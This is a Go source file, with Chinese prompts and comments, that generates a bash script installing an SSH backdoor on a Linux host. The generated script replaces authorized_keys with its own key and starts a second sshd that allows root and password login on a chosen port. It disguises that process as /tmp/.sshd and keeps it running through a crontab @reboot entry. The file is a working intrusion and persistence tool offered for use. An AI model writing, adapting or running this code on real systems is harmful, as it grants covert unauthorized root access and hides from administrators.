package ssh

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"
)

type SSHBackdoor struct {
	Port     int
	LinkPath string
	KeyPath  string
}

// 检查端口是否可用
func isPortAvailable(port int) bool {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return false
	}
	ln.Close()
	return true
}

// 获取用户输入
func getUserInput(prompt string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func NewSSHBackdoor() (*SSHBackdoor, error) {
	backdoor := &SSHBackdoor{
		LinkPath: "/tmp/.sshd",
		KeyPath:  "/tmp/.ssh_key",
	}

	for {
		portStr := getUserInput("请输入SSH后门端口 (1024-65535): ")
		port, err := strconv.Atoi(portStr)
		if err != nil {
			fmt.Println("[-] 错误: 请输入有效的数字")
			continue
		}

		if port < 1024 || port > 65535 {
			fmt.Println("[-] 错误: 端口必须在1024-65535之间")
			continue
		}

		if !isPortAvailable(port) {
			fmt.Printf("[-] 错误: 端口 %d 已被占用\n", port)
			continue
		}

		backdoor.Port = port
		fmt.Printf("[+] 端口 %d 可用\n", port)
		break
	}

	return backdoor, nil
}

func (s *SSHBackdoor) GeneratePayload(outDir string) error {
	mainScript := `#!/bin/bash
# SSH Backdoor Generator
# Generated at: {{.Timestamp}}

SSH_PORT={{.Port}}
LINK_PATH="{{.LinkPath}}"
KEY_PATH="{{.KeyPath}}"

# 创建隐藏目录
HIDE_DIR="/var/tmp/.system"
mkdir -p $HIDE_DIR

echo "[+] 生成SSH密钥对..."
ssh-keygen -t ed25519 -f $KEY_PATH -N "" 2>/dev/null

echo "[+] 设置.ssh目录权限..."
mkdir -p ~/.ssh
chmod 700 ~/.ssh
ls -la ~ | grep .ssh

echo "[+] 添加公钥到authorized_keys..."
cat ${KEY_PATH}.pub > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ls -la ~/.ssh/
echo "authorized_keys内容:"
cat ~/.ssh/authorized_keys

echo "[+] 创建sshd配置..."
cat > /tmp/sshd_config << EOF
Port $SSH_PORT
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

AuthorizedKeysFile %h/.ssh/authorized_keys
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin yes
StrictModes no

UsePAM yes
X11Forwarding yes
PrintMotd no

LogLevel DEBUG3

AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server
EOF

echo "[+] 验证sshd配置..."
/usr/sbin/sshd -t -f /tmp/sshd_config

echo "[+] 启动SSH服务..."
ln -sf /usr/sbin/sshd $LINK_PATH
pkill -f "$LINK_PATH -f /tmp/sshd_config"
$LINK_PATH -f /tmp/sshd_config -D -E /tmp/sshd.log &

# 等待服务启动
sleep 2

echo "[+] 验证SSH服务状态..."
if ! ps aux | grep -q "$LINK_PATH"; then
    echo "[-] 错误: SSH服务启动失败"
    tail -n 20 /tmp/sshd.log
    exit 1
fi

echo "[+] 添加持久化..."
echo "@reboot $LINK_PATH -f /tmp/sshd_config -D" | crontab -

echo "[+] 保存并设置私钥权限..."
install -m 600 $KEY_PATH ./id_ed25519
ls -la ./id_ed25519

echo "[+] 清理临时文件..."
rm -f ${KEY_PATH}*

echo "[+] SSH后门安装完成"
echo "[+] 后门端口: $SSH_PORT"
echo "[+] 使用方法:"
echo "    1. 下载id_ed25519，使用密钥登录:"
echo "       ssh -i ./id_ed25519 -p $SSH_PORT root@<目标IP>"
echo "    2. 使用密码登录:"
echo "       ssh -p $SSH_PORT root@<目标IP>"
echo
echo "[+] 重要提示:"
echo "    确保私钥文件权限为600: chmod 600 ./id_ed25519"
echo
echo "[+] 调试命令:"
echo "    查看sshd日志:   tail -f /tmp/sshd.log"
echo "    查看sshd配置:   cat /tmp/sshd_config"
echo "    查看公钥:       cat ~/.ssh/authorized_keys"
echo "    查看私钥权限:   ls -la ./id_ed25519"
echo "    查看进程:       ps aux | grep sshd"
echo
echo "[+] 测试本地连接:"
echo "    ssh -v -i ./id_ed25519 -p $SSH_PORT -o StrictHostKeyChecking=no root@127.0.0.1"
`
	scriptPath := filepath.Join(outDir, "ssh_backdoor.sh")
	return s.writeFile(scriptPath, mainScript, struct {
		Timestamp string
		Port      int
		LinkPath  string
		KeyPath   string
	}{
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		Port:      s.Port,
		LinkPath:  s.LinkPath,
		KeyPath:   s.KeyPath,
	})
}

func (s *SSHBackdoor) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("ssh").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
